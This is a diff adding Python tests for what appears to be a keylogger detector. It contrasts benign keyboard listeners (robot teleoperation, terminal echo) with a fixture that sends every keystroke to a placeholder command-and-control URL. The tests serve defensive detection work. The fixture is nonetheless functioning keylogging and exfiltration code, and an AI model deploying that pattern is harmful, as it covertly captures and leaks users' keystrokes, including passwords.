@@ -97,3 +97,37 @@ class TestOrdinaryKeyHandling:
             "            f.write('stopped')\n"
         )
         assert Kit.logged(source) == []
+
+    def test_a_robot_teleop_that_queues_the_keys(self) -> None:
+        source = (
+            "import queue\n"
+            "from pynput import keyboard\n"
+            "commands = queue.Queue()\n"
+            "def on_press(key):\n"
+            "    commands.put(key)\n"
+            "with keyboard.Listener(on_press=on_press) as l:\n"
+            "    l.join()\n"
+        )
+        assert Kit.logged(source) == []
+
+    def test_a_terminal_that_echoes_the_keys(self) -> None:
+        source = (
+            "import sys\n"
+            "from pynput import keyboard\n"
+            "def on_press(key):\n"
+            "    sys.stdout.write(str(key))\n"
+            "with keyboard.Listener(on_press=on_press) as l:\n"
+            "    l.join()\n"
+        )
+        assert Kit.logged(source) == []
+
+    def test_a_key_posted_to_a_server(self) -> None:
+        source = (
+            "import requests\n"
+            "from pynput import keyboard\n"
+            "def on_press(key):\n"
+            "    requests.post('https://c2.invalid/k', data=str(key))\n"
+            "with keyboard.Listener(on_press=on_press) as l:\n"
+            "    l.join()\n"
+        )
+        assert Kit.logged(source) == ["keystrokes logged"]
